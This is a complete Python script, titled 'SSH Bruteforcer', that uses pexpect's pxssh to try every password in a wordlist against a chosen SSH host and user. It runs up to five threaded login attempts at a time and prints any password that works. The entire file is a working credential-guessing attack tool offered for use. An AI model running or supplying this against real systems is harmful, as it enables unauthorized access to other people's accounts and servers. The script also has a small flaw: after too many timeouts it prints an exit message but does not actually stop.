from pexpect import pxssh
import argparse
import time
import threading

maxConnections = 5
connectionLock = threading.BoundedSemaphore(value=maxConnections)
Found = False
fails = 0

def connect(host,user,password,release):
	global Found
	global fails
	try:
		s = pxssh.pxssh()
		s.login(host,user,password)
		print('[+] password found: {}'.format(password))
		Found = True
	except Exception as e :
		if 'read_nonblocking' in str(e):
			fails +=1
			time.sleep(5)
			connect(host,user,password,False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host,user,password,False)
	finally:
		if release:
			connectionLock.release()

def main():
	parser = argparse.ArgumentParser(description='SSH Bruteforcer')
	required = parser.add_argument_group('Required Arguments')
	required.add_argument('-H',dest='host',help='Specify target host')
	required.add_argument('-u',dest='user',help='Specify target user')
	required.add_argument('-F',dest='passwordFile',help='Specify password file')
	options = parser.parse_args()
	host = options.host
	user = options.user
	passwordFile = options.passwordFile
	if host == None or user == None or passwordFile ==None:
		parser.print_help()
		exit(0)
	with open(passwordFile) as f:
		for line in f.readlines():
			
			if Found:
				print('[*] password found exiting')
				exit(0)
			if fails > 5:
				print('[!] Exiting: too many socket timeouts ')

			connectionLock.acquire()
			password = line.strip('\r').strip('\n')
			print("[-] Testing: " + str(password))
			t = threading.Thread(target=connect,args=(host,user,password,True))
			t.start()

if __name__ == '__main__':
	main()